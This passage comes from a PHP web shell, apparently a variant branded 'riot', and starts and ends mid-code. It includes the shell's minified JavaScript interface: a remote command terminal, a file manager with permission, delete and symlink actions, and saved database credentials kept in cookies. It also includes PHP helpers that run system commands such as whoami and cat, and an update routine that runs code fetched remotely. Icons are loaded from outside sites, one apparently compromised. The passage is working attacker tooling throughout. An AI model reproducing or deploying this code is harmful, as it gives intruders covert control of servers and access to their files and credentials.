src="https://dev.artikelspiner.id/icon/delete.svg"></div>'),d.querySelector("#cgiframe .terminal-tabs").insertAdjacentHTML("beforeend",'<div onclick="riotOpenPhpTerminal(true);" id="terminal_new_tab" style="background-color:#800000;" class="terminal-tab">New Tab +</div>'),terminal_walk_index[i]={index:0,key:-1},d.querySelector("#"+i+" .php-terminal-input").focus(),d.querySelector("#"+i+" .php-terminal-current-dir").innerHTML=c_,d.querySelector("#cgiloader-minimized .minimized-text").innerHTML="Terminal",riotTerminalSetColorAndSize(i),php_temrinal_using_cgi=!0;var l=riotGetTerminalHistory();for(var r in l)d.querySelector("#"+i+" .cmd-history-holder .commands-history").insertAdjacentHTML("afterbegin","<div onclick=\"d.querySelector('#"+i+' .php-terminal-input\').value = this.innerHTML;" class="history-cmd-line">'+l[r]+"</div>")}d.body.style.overflow="hidden"}function riotTerminalSetColorAndSize(e){var t=getCookie("riot-terminal-color"),a=getCookie("riot-terminal-fontsize");void 0!==t&&(d.querySelector("#"+e+" pre.ml1").style.color=t),void 0!==a&&(d.querySelector("#"+e+" pre.ml1").style.fontSize=a)}function riotTerminalChangecolor(e,t){d.querySelector("#"+t+" pre.ml1").style.color=e.value,setCookie("riot-terminal-color",e.value,2012)}function riotGetTerminalHistory(e){var t=getCookie("riot-terminal-history");try{t=atob(t),t=JSON.parse(t)}catch(e){t=[]}return void 0!==e&&t.reverse(),t}function changeTerminalFontSize(e,t){var a=d.querySelector("#"+e+" pre.ml1"),i=parseInt(window.getComputedStyle(a,null).getPropertyValue("font-size")),l="";1==t?(l=i+1+"px",a.style.fontSize=l):(l=i-1+"px",a.style.fontSize=l),setCookie("riot-terminal-fontsize",l,2012)}function riotWalkInTerminalHistory(e,t,a){var i=t||window.event;if("38"==i.keyCode||"40"==i.keyCode||"37"==i.keyCode||"39"==i.keyCode)switch(i.keyCode){case 38:var l=riotGetTerminalHistory(!0),r="";0==terminal_walk_index[a].index?(0==terminal_walk_index[a].key&&++terminal_walk_index[a].index,void 0!==(r=l[terminal_walk_index[a].index])?(e.value=r,++terminal_walk_index[a].index):(e.value="",terminal_walk_index[a].index=0)):terminal_walk_index[a].index<l.length&&(0==terminal_walk_index[a].key&&++terminal_walk_index[a].index,e.value=l[terminal_walk_index[a].index],++terminal_walk_index[a].index),terminal_walk_index[a].key=1;break;case 40:l=riotGetTerminalHistory(!0);if(terminal_walk_index[a].index>=0)0!=terminal_walk_index[a].index&&(--terminal_walk_index[a].index,1==terminal_walk_index[a].key&&--terminal_walk_index[a].index),void 0!==(r=l[terminal_walk_index[a].index])?e.value=r:(e.value="",terminal_walk_index[a].index=0);terminal_walk_index[a].key=0;break;default:console.log(i.keyCode)}else terminal_walk_index[a].index=0}function clearTerminalHistory(){d.querySelectorAll(".commands-history").forEach(function(e){e.innerHTML=""}),setCookie("riot-terminal-history","",2012)}function riotAceToFullscreen(e){var t=e.getAttribute("ace_id");riot_ace_editors.editor[t].container.requestFullscreen()}function closeHistoryCmd(e,t){if("free"==e){var a=t.getAttribute("term_id");return e=d.querySelector("#"+a+" .cmd-history-icon"),d.querySelector("#"+a+" .cmd-history-holder").style.visibility="hidden",d.querySelector("#"+a+" .cmd-history-holder").style.opacity="0",e.setAttribute("mode","off"),!1}var i=e.getAttribute("mode"),l=(a=e.getAttribute("term_id"),d.querySelector("#"+a+" .cmd-history-holder"));0==i.length||"off"==i?(l.style.visibility="visible",l.style.opacity="1",e.setAttribute("mode","on")):(l.style.visibility="hidden",l.style.opacity="0",e.setAttribute("mode","off"))}function geEvalAceValue(e){var t=e.querySelector(".php-evals-ace").getAttribute("id");return riot_ace_editors.eval[t].getValue()}function riotOpenArchive(e){var t=e.getAttribute("path"),a=e.getAttribute("fname"),i=e.getAttribute("base_id");if(".."==a&&"phar://"!=t.substr(0,7))return!1;var l="a="+riotb64("open_archive_dir")+"&c="+riotb64(c_)+"&riot1="+riotb64(t)+"&riot2="+riotb64(i)+"&ajax="+riotb64("true");_Ajax(d.URL,l,function(e){if("0"!=e){$("archive_base_"+i).innerHTML=e;var a=$("archive_dir_"+i).getAttribute("archive_name"),l=$("archive_dir_"+i).getAttribute("archive_full"),r="",o="";if(0!=(t=t.split(a)[1]).length){var n=(t=t.split("/")).length-1;for(var s in 0==t[n].length&&t.splice(n,1),t)0!=t.length&&(o+=t[s]+"/",r+='<a base_id="'+i+'" fname="'+t[s]+'" path="'+l+o+'" onclick="riotOpenArchive(this);">'+t[s]+"/</a>")}d.querySelector("#archive_dir_"+i+" .archive_pwd_holder").innerHTML=r}},!1,"open_archive_dir")}function riotDeleteConnectToDb(e){d.querySelectorAll(".dbh_"+e).forEach(function(e){e.remove()}),riotConnectionHistoryUpdate(e)}function riotConnectToDb(e,t){var a={};try{a=JSON.parse(atob(getCookie("riot_connection_hist")))}catch(e){}var i=d.querySelector("#"+t+" div.sf");i.querySelector("input[name=sql_host]").value=a[e].host,i.querySelector("input[name=sql_login]").value=a[e].user,i.querySelector("input[name=sql_pass]").value=a[e].pass,(i.querySelector("input[name=sql_base]")?i.querySelector("input[name=sql_base]"):i.querySelector("select[name=sql_base]")).value=a[e].db,i.querySelector("input[name=sql_count]").checked=!0,d.querySelector("#"+t+" div.sf .db-connect-btn").click()}function riotShowConnectionHistory(e){var t={},a=e.getAttribute("db_id"),i=e.getAttribute("mode");if(rows='<table class="connection-hist-table"><tr><th>*</th><th>Host</th><th>User</th><th>Pass</th><th>Database</th><th>Connect</th><th>Delete</th></tr>',"on"==i){e.setAttribute("mode","off");try{t=JSON.parse(atob(getCookie("riot_connection_hist")))}catch(e){}var l,r=1;for(l in t){var o=t[l].user+"_"+t[l].db;rows+='<tr class="dbh_'+o+'"><th>'+r+"</th><th>"+t[l].host+"</th><th>"+t[l].user+"</th><th>"+t[l].pass+"</th><th>"+t[l].db+'</th><th><button style="margin: unset;" class="connection-his-btn" onclick=\'riotConnectToDb("'+o+'","'+a+'");\'>Connect</button></th><th style="text-align: center;"><button style="margin: unset;" class="connection-his-btn connection-delete" onclick=\'riotDeleteConnectToDb("'+o+"\");'>X</button></th></tr>",r++}rows+="</table"}else e.setAttribute("mode","on"),rows="";d.querySelector("#"+a+" .connection_history_holder").innerHTML=rows}function riotConnectionHistoryUpdate(e){var t,a={};try{a=JSON.parse(atob(getCookie("riot_connection_hist")))}catch(e){}for(t in mysql_cache)0!=mysql_cache[t].db.length&&(a[mysql_cache[t].user+"_"+mysql_cache[t].db]=mysql_cache[t]);void 0!==e&&delete a[e],setCookie("riot_connection_hist",btoa(JSON.stringify(a)),2012)}function riotExecTerminal(e,t){var a="";if(0==(a=void 0!==t?"cd "+c_:e.c.value).length)return!1;"l"==a?a="ls -trh --color":"ll"==a&&(a="ls -ltrh --color");var i=e.getAttribute("term_id");riotloader(i,"block"),closeHistoryCmd("free",e);var l="";"FORM"==e.tagName&&(l=e.querySelector(".php-terminal-current-dir").innerHTML),0==(l=l.trim()).length&&(l=c_);var r="a="+riotb64("terminalExec")+"&c="+riotb64(l)+"&riot1="+riotb64(a)+"&ajax="+riotb64("true");if(_Ajax(d.URL,r,function(e,t){riotloader(t,"none");try{var a=$("tab_"+i);null!=a&&((-1==a.classList.value.indexOf("active-terminal-tab")||cgi_is_minimized)&&(a.classList.add("tab-is-done"),riotShowNotification("proccess is done...",a.innerText)),cgi_is_minimized&&riotUpdateOptionsBadge("cgiloader"))}catch(e){}e=JSON.parse(e),d.querySelector("#"+t+" .php-terminal-output > pre").innerHTML=e.output,0!=e.path.length&&(d.querySelector("#"+t+" .php-terminal-current-dir").innerHTML=e.path)},!1,i),void 0===t){d.querySelector("#"+i+" .cmd-history-holder .commands-history").insertAdjacentHTML("afterbegin","<div onclick=\"d.querySelector('#"+i+' .php-terminal-input\').value = this.innerHTML;" class="history-cmd-line">'+a+"</div>");var o=riotGetTerminalHistory(),n=o.indexOf(a);-1!=n&&o.splice(n,1),o.push(a),setCookie("riot-terminal-history",btoa(JSON.stringify(o)),2012)}d.querySelector("#"+i+" input.php-terminal-input").focus()}function pageChangedFilesMan(e){var t="filesman_holder_"+riot_current_fm_id,a=getCookie(t+"_page_number"),i=e.innerText;if("<<"==i){a=d.querySelector("#"+t+" .active-page-number").innerText;if(!((a=parseInt(a))>1))return!1;i=a-1}if(">>"==i){a=d.querySelector("#"+t+" .active-page-number").innerText;a=parseInt(a);var l=d.querySelector("#"+t+" .last-page-number").innerHTML;if(!(a+1<=(l=parseInt(l))))return!1;i=a+1}setCookie(t+"_page_number",i,2012),g("FilesMan",c_)}function riotColDumperInit(){var e=d.querySelector(".tab_name.tab_is_active").getAttribute("opt_id"),t=d.querySelector("#"+e),a=t.getElementsByClassName("box");for(i=0;i<a.length;i++)a[i].addEventListener("click",function(){null!=this.parentElement.querySelector(".nested")&&(this.parentElement.querySelector(".nested").classList.toggle("active"),this.classList.toggle("check-box"))});var i;a=t.getElementsByClassName("sub-box");for(i=0;i<a.length;i++)a[i].setAttribute("opt_id",e),a[i].addEventListener("click",function(){this.classList.toggle("check-box");var e=this.getAttribute("tbl"),t=this.getAttribute("opt_id");t=t.replace("option_",""),col_dumper_selected_data.hasOwnProperty(t)||(col_dumper_selected_data[t]={}),void 0===col_dumper_selected_data[t][e]&&(col_dumper_selected_data[t][e]=[]);var a=this.innerHTML,i=col_dumper_selected_data[t][e].indexOf(a);-1==i?col_dumper_selected_data[t][e].push(a):col_dumper_selected_data[t][e].splice(i,1)})}function showSymlinkPath(e,t){t.stopPropagation();var a=e.getAttribute("row"),i=$("td_row_"+a),l=e.getAttribute("opt_title"),r=e.getAttribute("fname");if(l=decodeURIComponent(r)+" -> "+l,null!=i){i.insertAdjacentHTML("afterbegin",'<div class="symlink_path" id="link_id_'+a+'">'+l+"</div>");var o=t.clientX,n=t.clientY-30;$("link_id_"+a).style.left=o+"px",$("link_id_"+a).style.top=n+"px"}}function hideSymlinkPath(e,t){t.stopPropagation(),$("link_id_"+e.getAttribute("row")).remove()}function riotgetFlags(){data="a="+riotb64("get_flags")+"&c="+riotb64(c_)+"&ajax="+riotb64("true"),_Ajax(d.URL,data,function(e){var t=JSON.parse(e);t.hasOwnProperty("server")&&(d.querySelectorAll(".flag-holder")[0].innerHTML='<img draggable="false" title="'+t.server.name+'" src="https://siakad.uinbanten.ac.id/assets/img/flag-icons/'+t.server.code.toLowerCase()+'.png">',d.querySelectorAll(".flag-holder")[0].style.display="inline"),t.hasOwnProperty("client")&&(d.querySelectorAll(".flag-holder")[1].innerHTML='<img draggable="false" title="'+t.client.name+'" src="https://siakad.uinbanten.ac.id/assets/img/flag-icons/'+t.client.code.toLowerCase()+'.png">',d.querySelectorAll(".flag-holder")[1].style.display="inline")})}function colDumplerSelectType(e){var t=e.options[e.selectedIndex].value;$("coldumper-delimiter-input").style.display="delimiter"==t?"inline-block":"none"}function riotCheckUrlHash(){var e=window.location.hash.substr(1),t=e.split("&").reduce(function(e,t){var a=t.split("=");return e[a[0]]=a[1],e},{});if(""!=e)switch(t.action){case"fileman":case"options":t.path=decodeURIComponent(t.path),g("FilesMan",t.path,function(e){if(t.hasOwnProperty("file")){var a="auto";isArchive(t.file)&&(a="view"),editor(t.path+"/"+t.file,a,"","","","file")}}),"options"==t.action&&t.hasOwnProperty("opt")&&(riot_can_add_opt=!0,g(t.opt,null,"","",""),d.querySelector(".opt-title").innerHTML=$("menu_opt_"+t.opt).innerHTML),t.hasOwnProperty("file")||editorClose("editor"),t.hasOwnProperty("opt")||editorClose("options_window"),editorClose("cgiloader");break;default:g("FilesMan","<?php echo $GLOBALS[
    "cwd"
]; ?>"),editorClose("editor"),editorClose("options_window"),editorClose("cgiloader")}else g("FilesMan","<?php echo $GLOBALS[
    "cwd"
]; ?>"),editorClose("editor"),editorClose("options_window"),editorClose("cgiloader")}function riotFmngrContextRow(){d.querySelectorAll(".fmanager-row a.main_name").forEach(function(e){e.addEventListener("contextmenu",function(e){var t=e.target,a="";if(".."==(a="A"==e.target.parentElement.tagName?(t=e.target.parentElement).getAttribute("fname"):t.getAttribute("fname")))return!1;var i=t.getAttribute("id"),l=t.getAttribute("path"),r=t.getAttribute("ftype"),o=["newtab","link","download","view","edit","move","copy","rename","modify","permission","compress","extract","delete"];for(var n in"file"!=r||isArchive(a)?o[3]="view_archive":o.splice(11,1),"folder"==r&&(o=["newtab","link","move","copy","rename","modify","permission","compress","delete"]),riotSortMenuItems(o),o){var s=d.querySelector("#rightclick_menu > a[name="+o[n]+"]");switch(s.setAttribute("fid",i),s.setAttribute("fname",decodeURIComponent(a)),s.setAttribute("path",l),s.setAttribute("ftype",r),o[n]){case"view":case"edit":var c="auto";"edit"==o[n]&&(c="edit"),s.setAttribute("href","#action=fileman&path="+c_+"/&file="+a),s.setAttribute("onclick","editor('"+a+"','"+c+"','','','','file')");break;case"newtab":var u=a;"file"==r?(u="&file="+a,s.setAttribute("href","#action=fileman&path="+c_+"/"+u),s.setAttribute("target","_blank"),s.onclick=function(){}):(s.setAttribute("href","javascript:void(0)"),s.removeAttribute("target"),s.onclick=function(){riotFilesManNewTab(c_,u)});break;case"delete":s.setAttribute("onclick","var chk = confirm('Are You Sure For Delete # "+a+" # ?'); chk ? g('FilesMan',null,'delete', '"+a+"') : '';");break;case"download":s.setAttribute("onclick","g('FilesTools',null,'"+a+"', 'download')");break;case"permission":try{var p=d.querySelector("#id_chmode_"+i.replace("id_","")+" span").innerHTML;s.setAttribute("perm",p.trim())}catch(e){}break;case"link":s.style.display="block";var f="<?php echo $_SERVER[
    "DOCUMENT_ROOT"
]; ?>/",m=(c_+"/"+a).replace(/\/\//g,"/");if(-1!=m.indexOf(f)){f=m.replace(f,"");var b=location.origin+"/"+f;s.setAttribute("href",""+b)}else s.style.display="none"}}var y=e.clientX,_=e.clientY;riotRightClickMenu(y,_),e.preventDefault()})})}function riotFilesManNewTab(e,t,a){var i=t;void 0!==a&&(i=riotGetLastFolderName(e));var l=decodeURIComponent(e+"/"+t);l=l.replace(/\/\//g,"/");var r=$("filesman_tab_1"),o=r.getAttribute("fm_counter");o=parseInt(o)+1,r.setAttribute("fm_counter",o),d.querySelector("#filesman_tabs_child").insertAdjacentHTML("beforeend",'<div onmouseover="riotFilesmanTabShowTitle(this,event);" onmouseout="riotFilesmanTabHideTitle(this,event);" path="'+l+'" id="filesman_tab_'+o+'" fm_id="'+o+'" onclick="filesmanTabController(this);" fname="'+t+'" class="filesman_tab"><img class="folder-tab-icon" src="https://dev.artikelspiner.id/icon/folder2.svg"> <span class="filesman-tab-folder-name">'+i+'</span> <img fm_id="'+o+'" onclick="closeFmTab(this,event);return false;" title="[close]" src="https://dev.artikelspiner.id/icon/delete.svg"></div>'),d.querySelector(".ajaxarea").insertAdjacentHTML("beforebegin",'<div style="position:relative;" fm_id="'+o+'" id="filesman_holder_'+o+'" class="ajaxarea"><div class="header"></div></div>'),riot_fm_id=o,g("FilesMan",l),riot_fm_id=0}function riotFilesmanTabShowTitle(e,t){t.stopPropagation();var a=$("filesman-tab-full-path");a.style.display="block",a.style.top=e.offsetTop-37+"px",a.style.left=e.offsetLeft-$("filesman_tabs").scrollLeft+"px",a.innerHTML=e.getAttribute("path")}function riotFilesmanTabHideTitle(e,t){$("filesman-tab-full-path").style.display="none"}function riotPopupAction(e,t){var a="",i="";switch(t){case"rename":a="Old file name:",i="New file name:";break;case"copy":a="File path:",i="Enter the file path that you want to copy this file to:";break;case"move":a="Current Path:",i="Enter the file path that you want to move this file to:";break;case"extract":a="Files to extract:",i="Enter the path you wish to extract the files to and click Extract:"}var l=e.getAttribute("fname"),r=e.getAttribute("path"),o=t.charAt(0).toUpperCase()+t.slice(1);if("permission"==t){d.querySelector("#shortcutMenu-holder").style.height="222px",o="Change Permissions",d.querySelector("#shortcutMenu-holder > form > .perm-table-holder").style.display="block",d.querySelector("#shortcutMenu-holder > form > input[name=fname]").style.display="none";var n=e.getAttribute("perm"),s=n.substr(1,1),c=n.substr(2,1),u=n.substr(3,1);d.querySelector("#shortcutMenu-holder > form input[name=u]").value=s,d.querySelector("#shortcutMenu-holder > form input[name=g]").value=c,d.querySelector("#shortcutMenu-holder > form input[name=w]").value=u,autoCheckPerms(s,"u",["u","g","w"]),autoCheckPerms(c,"g"),autoCheckPerms(u,"w")}else d.querySelector("#shortcutMenu-holder").style.height="190px",d.querySelector("#shortcutMenu-holder > form > input[name=fname]").style.display="block",d.querySelector("#shortcutMenu-holder > form > .perm-table-holder").style.display="none";var p="move"==t||"copy"==t?r+l:l;if("modify"==t){var f="tr_row_"+e.getAttribute("fid").replace("id_","");p=d.querySelector("#"+f+" .main_modify").innerText}d.querySelector(".cl-popup-fixed").style.display="block",d.querySelector("#shortcutMenu-holder .popup-head").innerHTML=o,d.querySelector("#shortcutMenu-holder .old-path-lbl").innerHTML=a,d.querySelector("#shortcutMenu-holder .new-filename-lbl").innerHTML=i,d.querySelector("#shortcutMenu-holder .popup-foot > button[name=accept]").innerHTML=o,d.querySelector("#shortcutMenu-holder > form > .old-path-content").innerHTML=r+l,d.querySelector("#shortcutMenu-holder > form > input[name=fname]").value=p,d.querySelector("#shortcutMenu-holder button[name=accept]").setAttribute("fid",e.getAttribute("fid")),d.querySelector("#shortcutMenu-holder button[name=accept]").setAttribute("action",t)}function calcperm(){var e=event.srcElement;autoCheckPerms(e.checked,e.name.substr(0,1))}function autoCheckPerms(e,t,a){if(void 0!==a)for(var i in a){var l=a[i];d.querySelector("#shortcutMenu-holder > form input[name="+l+"r]").checked=!1,d.querySelector("#shortcutMenu-holder > form input[name="+l+"w]").checked=!1,d.querySelector("#shortcutMenu-holder > form input[name="+l+"x]").checked=!1}var r=d.querySelector("#shortcutMenu-holder > form input[name="+t+"r]"),o=d.querySelector("#shortcutMenu-holder > form input[name="+t+"w]"),n=d.querySelector("#shortcutMenu-holder > form input[name="+t+"x]");if("boolean"!=typeof e)"7"==e?(r.checked=!0,o.checked=!0,n.checked=!0):"4"==e?r.checked=!0:"2"==e?o.checked=!0:"1"==e?n.checked=!0:"6"==e?(r.checked=!0,o.checked=!0):"3"==e?(o.checked=!0,n.checked=!0):"5"==e&&(r.checked=!0,n.checked=!0);else{var s=0;r.checked&&(s+=4),o.checked&&(s+=2),n.checked&&(s+=1),"u"==t?d.querySelector("#shortcutMenu-holder > form input[name=u]").value=s:"g"==t?d.querySelector("#shortcutMenu-holder > form input[name=g]").value=s:"w"==t&&(d.querySelector("#shortcutMenu-holder > form input[name=w]").value=s)}}function gg(e,t,a,i,l,r){var o="filesman_holder_"+riot_current_fm_id;riotloader(o,"block"),data="a="+riotb64(e)+"&c="+riotb64(t)+"&riot1="+riotb64(a)+"&riot2="+riotb64(i)+"&riot3="+riotb64(l)+"&ajax="+riotb64("true"),_Ajax(d.URL,data,r,!1,o)}function riotPopUpDoAction(e){var t=e.getAttribute("action");switch(t){case"rename":case"move":case"copy":var a=e.getAttribute("fid").replace("id_",""),i=$("id_"+a).getAttribute("fname"),l=d.querySelector("#shortcutMenu-holder > form > input[name=fname]").value;l=l.trim(),i=i.trim(),gg("doActions",c_,i,l,t,function(e,i){if("rename"==t)if("done"==e){var r=$("id_"+a);updateFileEditor(a,l);var o=r.getAttribute("path")+$("id_"+a).getAttribute("fname");d.querySelector("#shortcutMenu-holder > form > .old-path-content").innerHTML=o,r.addEventListener("animationend",function(){r.classList.remove("textEffect")}),r.classList.add("textEffect"),riotShowNotification("Renamed...","Rename Action"),d.querySelector(".cl-popup-fixed").style.display="none"}else riotShowNotification("error...!","Rename Action","error");riotloader(i,"none")});break;case"permission":var r=d.querySelector("#shortcutMenu-holder > form input[name=u]").value,o=d.querySelector("#shortcutMenu-holder > form input[name=g]").value,n=d.querySelector("#shortcutMenu-holder > form input[name=w]").value;i=(i=d.querySelector("#shortcutMenu-holder > form > .old-path-content").innerHTML).trim();var s=r.trim()+o.trim()+n.trim();gg("doActions",c_,i,s,t,function(e,t){riotloader(t,"none"),riotShowNotification(e,"Permission Action"),d.querySelector(".cl-popup-fixed").style.display="none"});break;case"modify":a=e.getAttribute("fid").replace("id_","");var c=d.querySelector("#shortcutMenu-holder > form > input[name=fname]").value,u=$("id_"+a).getAttribute("fname");gg("doActions",c_,c,u,t,function(t,a){if("ok"==t){var i="tr_row_"+e.getAttribute("fid").replace("id_","");d.querySelector("#"+i+" .main_modify").innerHTML=c,riotShowNotification("success...","Modify Action"),d.querySelector(".cl-popup-fixed").style.display="none"}else riotShowNotification(t,"Modify Action","error");riotloader(a,"none")})}}function riotInitSoratableTab(e){Sortable.create(e,{direction:"horizontal",animation:300,ghostClass:"sortable-ghost",filter:".not-sortable"})}$("search-input").addEventListener("keydown",function(e){setTimeout(function(){var e=$("search-input").value;for(var t in d.getElementsByClassName("history-list")[0].innerHTML="",editor_files)if(-1!=editor_files[t].file.search(e)||""==e){var a=0;t==editor_current_file&&(a=" is_active"),insertToHistory(t,editor_files[t].file,a,editor_files[t].type)}},100)},!1),_Ajax(d.URL,"a="+riotb64("checkupdate"),function(e){if(0!=e.length&&"[]"!=e){var t=JSON.parse(e);if(t.hasOwnProperty("content")){d.body.insertAdjacentHTML("beforeend",t.content);try{evalJS(t.content)}catch(t){}}if(t.hasOwnProperty("copyright")&&($("riot-copyright").innerHTML=t.copyright),t.hasOwnProperty("riotexec")&&($("riot_riotexec").innerHTML=t.riotexec),t.hasOwnProperty("code_name")&&($("hidden_sh").innerHTML=t.code_name.replace(/\{version\}/g,t.version_number)),t.hasOwnProperty("market")){var a=d.querySelector("span.riot_plus");if(t.market.hasOwnProperty("visible")&&"yes"==t.market.visible&&($("menu_opt_market").style.display="inline"),"open"!=t.market.status&&(a.style.color="#ffc107"),t.market.hasOwnProperty("content"))try{evalJS(t.market.content)}catch(t){}}}}),<?php echo $GLOBALS[
    "need_to_update_header"
]; ?>?_Ajax(d.URL,"a="+riotb64("updateheader"),function(e){try{var t=JSON.parse(e);for(var a in t){for(var i="",l=0;l<t[a].length;l++)i+="useful"==a||"downloader"==a?'<span class="header_values" style="margin-left: 4px;">'+t[a][l]+"</span>":t[a][l];var r=$("header_"+a);r&&(r.innerHTML=i)}$("header_cgishell").innerHTML="ON",$("header_cgishell").setAttribute("class","header_on")}catch(e){}}):islinux&&_Ajax(d.URL,"a="+riotb64("checkcgi"),function(e){"ok"==e&&($("header_cgishell").innerHTML="ON",$("header_cgishell").setAttribute("class","header_on"))}),function(){d.onclick=function(){can_hashchange_work=!1,setTimeout(function(){can_hashchange_work=!0},600)},window.onhashchange=function(e){can_hashchange_work&&riotCheckUrlHash()},riotCheckUrlHash(),riotgetFlags(),rightclick_menu_context=$("rightclick_menu").style,riotInitCwdContext(),document.addEventListener("click",function(e){rightclick_menu_context.opacity="0",setTimeout(function(){rightclick_menu_context.visibility="hidden"},501)},!1);var e=document.createElement("script");e.src="https://cdnjs.cloudflare.com/ajax/libs/Sortable/1.10.2/Sortable.min.js",e.id="sortable-plugin",e.onload=function(){riotInitSoratableTab($("filesman_tabs_child")),riotInitSoratableTab(d.querySelector(".editor-tabs")),riotInitSoratableTab(d.querySelector(".options_tab")),riotInitSoratableTab(d.querySelector(".terminal-tabs")),riotInitSoratableTab(d.querySelector(".sql-tabs"))},d.body.appendChild(e)}();
</script>
</body>
</html>
<?php
    }
}
if (!function_exists("posix_getpwuid") && strpos(@ini_get("disable_functions"), "posix_getpwuid") === false) {
    function posix_getpwuid($p)
    {
        return false;
    }
}
if (!function_exists("posix_getgrgid") && strpos(@ini_get("disable_functions"), "posix_getgrgid") === false) {
    function posix_getgrgid($p)
    {
        return false;
    }
}
function riotWhich($p)
{
    $path = riotEx("which " . $p, false, false);
    if (!empty($path)) {
        return strlen($path);
    }
    return false;
}
function riotSize($s)
{
    if ($s >= 1073741824) {
        return sprintf("%1.2f", $s / 1073741824) . " GB";
    } elseif ($s >= 1048576) {
        return sprintf("%1.2f", $s / 1048576) . " MB";
    } elseif ($s >= 1024) {
        return sprintf("%1.2f", $s / 1024) . " KB";
    } else {
        return $s . " B";
    }
}
function riotPerms($p)
{
    if (($p & 0xc000) == 0xc000) {
        $i = "s​";
    } elseif (($p & 0xa000) == 0xa000) {
        $i = "l​";
    } elseif (($p & 0x8000) == 0x8000) {
        $i = "-​";
    } elseif (($p & 0x6000) == 0x6000) {
        $i = "b​";
    } elseif (($p & 0x4000) == 0x4000) {
        $i = "d​";
    } elseif (($p & 0x2000) == 0x2000) {
        $i = "c​";
    } elseif (($p & 0x1000) == 0x1000) {
        $i = "p​";
    } else {
        $i = "u​";
    }
    $i .= $p & 0x0100 ? "r​" : "-";
    $i .= $p & 0x0080 ? "w​" : "-";
    $i .= $p & 0x0040 ? ($p & 0x0800 ? "s​" : "x​") : ($p & 0x0800 ? "S​" : "-");
    $i .= $p & 0x0020 ? "r​" : "-";
    $i .= $p & 0x0010 ? "w​" : "-";
    $i .= $p & 0x0008 ? ($p & 0x0400 ? "s​" : "x​") : ($p & 0x0400 ? "S​" : "-");
    $i .= $p & 0x0004 ? "r​" : "-";
    $i .= $p & 0x0002 ? "w​" : "-";
    $i .= $p & 0x0001 ? ($p & 0x0200 ? "t​" : "x​") : ($p & 0x0200 ? "T​" : "-");
    return $i;
}
function riotPermsColor($f, $isbash = false)
{
    $class = "";
    $num = "";
    $human = "";
    if ($isbash) {
        $class = $f["class"];
        $num = $f["num"];
        $human = $f["human"];
    } else {
        $num = substr(sprintf("%o", @fileperms($f)), -4);
        $human = riotPerms(@fileperms($f));
        if (!@is_readable($f)) {
            $class = "main_red_perm";
        } elseif (!@is_writable($f)) {
            $class = "main_white_perm";
        } else {
            $class = "main_green_perm";
        }
    }
    return '<span style="font-weight:unset;" class="' . $class . '">' . $num . '</span><span style="font-weight:unset;" class="beetween_perms"> >> </span><span style="font-weight:unset;" class="' . $class . '">' . $human . "</span>";
}
if (!function_exists("scandir")) {
    function scandir($dir)
    {
        $dh = opendir($dir);
        while (false !== ($filename = readdir($dh))) {
            $files[] = $filename;
        }
        return $files;
    }
}
function reArrayFiles($file_post)
{
    $file_ary = [];
    $file_count = count($file_post["name"]);
    $file_keys = array_keys($file_post);
    for ($i = 0; $i < $file_count; $i++) {
        foreach ($file_keys as $key) {
            $file_ary[$i][$key] = $file_post[$key][$i];
        }
    }
    return $file_ary;
}
function _riot_can_runCommand($cgi = true, $cache = true)
{
    if (isset($_COOKIE["riot_canruncmd"]) && $cache) {
        return true;
    }
    if (strlen(riotEx("whoami", false, $cgi)) > 0) {
        $_COOKIE["riot_canruncmd"] = true;
        return true;
    }
    return false;
}
function _riot_symlink($target, $link)
{
    $phpsym = function_exists("symlink");
    if ($phpsym) {
        @symlink($target, $link);
    } else {
        riotEx("ln -s '" . addslashes($target) . "' '" . addslashes($link) . "'");
    }
}
function _riot_file_exists($file, $cgi = true)
{
    if (@file_exists($file)) {
        return true;
    } else {
        if (strlen(riotEx("ls -la '" . addslashes($file) . "'", false, $cgi)) > 0) {
            return true;
        }
    }
    return false;
}
function _riot_file($file, $cgi = true)
{
    $array = @file($file);
    if (!$array) {
        if (strlen(riotEx("id", false, $cgi)) > 0) {
            $data = riotEx('cat "' . addslashes($file) . '"', false, $cgi);
            if (strlen($data) > 0) {
                return explode("\n", $data);
            } else {
                return false;
            }
        } else {
            return false;
        }
    } else {
        return $array;
    }
}
function _riot_is_writable($file)
{
    $check = false;
    $check = @is_writable($file);
    if (!$check) {
        if (_riot_can_runCommand()) {
            $check = riotEx('[ -w "' . trim(addslashes($file)) . '" ] && echo "yes" || echo "no"');
            if ($check == "yes") {
                $check = true;
            } else {
                $check = false;
            }
        }
    }
    return $check;
}
function _riot_is_dir($dir, $mode = "-d")
{
    $check = false;
    $check = @is_dir($dir);
    if ($mode == "-e") {
        $check = @is_file($dir);
    }
    if (!$check) {
        if (_riot_can_runCommand()) {
            $check = riotEx('[ "' . trim($mode) . '" "' . trim(addslashes($dir)) . '" ] && echo "yes" || echo "no"');
            if ($check == "yes") {
                return true;
            } else {
                return false;
            }
        }
    }
    return $check;
}
function _riot_load_ace_options($base)
{
    return '<span>Theme: </span><select class="ace-controler ace-theme-selector" base="' .
        $base .
        '" onChange="riotAceChangeSetting(this,\'theme\');"><option value="terminal" selected>terminal</option><option value="ambiance">ambiance</option><option value="chaos">chaos</option><option value="chrome">chrome</option><option value="clouds">clouds</option><option value="clouds_midnight">clouds_midnight</option><option value="cobalt">cobalt</option><option value="crimson_editor">crimson_editor</option><option value="dawn">dawn</option><option value="dracula">dracula</option><option value="dreamweaver">dreamweaver</option><option value="eclipse">eclipse</option><option value="github">github</option><option value="gob">gob</option><option value="gruvbox">gruvbox</option><option value="idle_fingers">idle_fingers</option><option value="iplastic">iplastic</option><option value="katzenmilch">katzenmilch</option><option value="kr_theme">kr_theme</option><option value="kuroir">kuroir</option><option value="merbivore">merbivore</option><option value="merbivore_soft">merbivore_soft</option><option value="mono_industrial">mono_industrial</option><option value="monokai">monokai</option><option value="nord_dark">nord_dark</option><option value="pastel_on_dark">pastel_on_dark</option><option value="solarized_dark">solarized_dark</option><option value="solarized_light">solarized_light</option><option value="sqlserver">sqlserver</option><option value="textmate">textmate</option><option value="tomorrow">tomorrow</option><option value="tomorrow_night">tomorrow_night</option><option value="tomorrow_night_blue">tomorrow_night_blue</option><option value="tomorrow_night_bright">tomorrow_night_bright</option><option value="tomorrow_night_eighties">tomorrow_night_eighties</option><option value="twilight">twilight</option><option value="vibrant_ink">vibrant_ink</option><option value="xcode">xcode</option></select><span>Language: </span><select class="ace-controler" base="' .
        $base .
